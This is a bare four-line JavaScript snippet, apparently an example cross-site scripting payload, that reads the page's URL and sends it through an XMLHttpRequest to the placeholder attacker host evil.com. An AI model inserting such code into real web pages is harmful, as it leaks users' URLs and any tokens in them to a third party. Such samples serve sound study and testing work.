var p = document.location;
var x = new XMLHttpRequest();
x.open("GET", "http://evil.com");
x.send(p);